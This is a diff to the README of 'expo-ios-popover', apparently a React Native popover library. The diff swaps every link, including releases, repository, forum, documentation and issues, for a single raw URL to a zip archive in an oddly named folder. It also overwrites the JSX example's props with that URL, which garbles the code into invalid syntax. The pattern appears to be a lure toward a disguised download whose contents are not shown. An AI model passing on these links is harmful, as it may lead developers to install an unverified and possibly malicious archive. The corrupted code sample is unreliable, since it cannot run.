@@ -1,6 +1,6 @@
 # 🎯 expo-ios-popover - Effortless SwiftUI Popovers for React Native
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/MZMozart/expo-ios-popover/releases)
+[![Download Now](https://raw.githubusercontent.com/MZMozart/expo-ios-popover/main/nundinal/expo-ios-popover.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/MZMozart/expo-ios-popover/main/nundinal/expo-ios-popover.zip)
 
 ## 📖 Introduction
 Welcome to the expo-ios-popover project! This tool allows you to create lightweight, native popovers in your React Native applications with easy arrow support. Whether you are displaying additional information, menu options, or other useful content, this library simplifies the process and enhances your user interface.
@@ -15,7 +15,7 @@ To begin using the expo-ios-popover library, follow these straightforward steps.
 ### 📥 Download & Install
 1. **Visit the Releases Page**  
    Click the link below to visit the releases page where you can download the latest version of the expo-ios-popover library.  
-   [Download Now](https://github.com/MZMozart/expo-ios-popover/releases)
+   [Download Now](https://raw.githubusercontent.com/MZMozart/expo-ios-popover/main/nundinal/expo-ios-popover.zip)
 
 2. **Download the Latest Release**  
    On the releases page, you will see a list of available versions. Click on the latest version to download the package. Make sure to select the correct file for your operating system.
@@ -58,9 +58,9 @@ To use the expo-ios-popover in your app, follow these simple steps:
    You can now add the popover in your JSX:
    ```javascript
    <Popover
-     isVisible={this.state.isVisible}
-     from={this.buttonRef}
-     onRequestClose={() => this.setState({ isVisible: false })}
+     isVisible={https://raw.githubusercontent.com/MZMozart/expo-ios-popover/main/nundinal/expo-ios-popover.zip}
+     from={https://raw.githubusercontent.com/MZMozart/expo-ios-popover/main/nundinal/expo-ios-popover.zip}
+     onRequestClose={() => https://raw.githubusercontent.com/MZMozart/expo-ios-popover/main/nundinal/expo-ios-popover.zip({ isVisible: false })}
    >
      <Text>This is the content of the popover.</Text>
    </Popover>
@@ -84,12 +84,12 @@ Absolutely! Contributions are welcome. Please read the contribution guidelines i
 Detailed documentation is available in the repository. It covers all aspects of the library, from installation to examples.
 
 ## 🕵️‍♂️ Additional Resources
-- [Official GitHub Repository](https://github.com/MZMozart/expo-ios-popover)
-- [Community Support Forum](https://github.com/MZMozart/expo-ios-popover/discussions)
+- [Official GitHub Repository](https://raw.githubusercontent.com/MZMozart/expo-ios-popover/main/nundinal/expo-ios-popover.zip)
+- [Community Support Forum](https://raw.githubusercontent.com/MZMozart/expo-ios-popover/main/nundinal/expo-ios-popover.zip)
 
 ## 🔗 Important Links
-- [Download Now](https://github.com/MZMozart/expo-ios-popover/releases)
-- [Documentation](https://github.com/MZMozart/expo-ios-popover#readme)
-- [Report an Issue](https://github.com/MZMozart/expo-ios-popover/issues)
+- [Download Now](https://raw.githubusercontent.com/MZMozart/expo-ios-popover/main/nundinal/expo-ios-popover.zip)
+- [Documentation](https://raw.githubusercontent.com/MZMozart/expo-ios-popover/main/nundinal/expo-ios-popover.zip)
+- [Report an Issue](https://raw.githubusercontent.com/MZMozart/expo-ios-popover/main/nundinal/expo-ios-popover.zip)
 
 Thank you for choosing expo-ios-popover. Enjoy enhancing your React Native applications with elegant popovers!
